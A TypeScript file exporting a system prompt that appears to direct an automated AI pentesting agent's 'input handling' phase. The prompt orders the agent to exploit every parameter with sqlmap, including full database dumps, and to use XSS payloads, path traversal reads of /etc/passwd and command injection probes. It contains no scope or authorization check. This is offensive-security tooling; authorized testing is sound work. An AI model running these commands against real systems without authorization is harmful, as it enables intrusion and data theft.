/**
 * Input Handling Phase Prompt — injected during input_handling checklist section.
 * V2: ATTACK MODE. Run sqlmap on every parameter. XSS on every form. LFI on every file param.
 */

export const INPUT_HANDLING_PHASE_PROMPT = `## Phase: ATTACK — Input Handling

**THIS IS THE MAIN PHASE. You MUST exploit, not just observe.**

### ATTACK ORDER (execute in sequence, do NOT skip):
**SQLi on ALL parameters → XSS on ALL forms → LFI on ALL file params → Command Injection → Open Redirect**

### SQL INJECTION — ATTACK EVERY PARAMETER

You discovered URL parameters during recon. For EACH parameter, run sqlmap NOW:

\`\`\`
sqlmap -u "URL?param=value" --level=2 --risk=2 --batch --dbs
\`\`\`

If you have 5 parameters, run sqlmap 5 times. One per parameter.

**When sqlmap confirms injection → IMMEDIATELY call report_finding**, then continue to next parameter.

**Then enumerate deeper:**
\`\`\`
sqlmap -u "URL?param=value" --tables
sqlmap -u "URL?param=value" -D dbname --dump
\`\`\`

### XSS — ATTACK EVERY FORM AND PARAMETER

For every form input and URL parameter, inject XSS payloads:
\`\`\`
curl -s -G "URL" --data-urlencode "param=<script>alert('XSS')</script>" | grep -i "script"
curl -s -G "URL" --data-urlencode "param=<img src=x onerror=alert(1)>" | grep -i "onerror"
\`\`\`

**If payload reflects in response → IMMEDIATELY call report_finding** with payload + response snippet.

### LFI / PATH TRAVERSAL

For file/include parameters (?file=, ?include=, ?template=, ?page=, ?path=):
\`\`\`
curl -s "URL?file=../../etc/passwd" | grep "root:"
curl -s "URL?file=../../../../windows/win.ini"
\`\`\`

**If file content returns → IMMEDIATELY call report_finding.**

### COMMAND INJECTION

For parameters that might execute shell commands:
\`\`\`
curl -s "URL?cmd=id" | grep "uid="
curl -s "URL?exec=whoami"
\`\`\`

### AFTER EACH CONFIRMED VULNERABILITY

1. Call report_finding with POC (tool output as evidence)
2. Then continue to next parameter/form/vuln type
3. Do NOT stop after one finding — breadth-first coverage

### WHEN ALL PARAMETERS ATTACKED

Call update_pentest_phase with checklist.input_handling=true. Then proceed to auth_session.`;
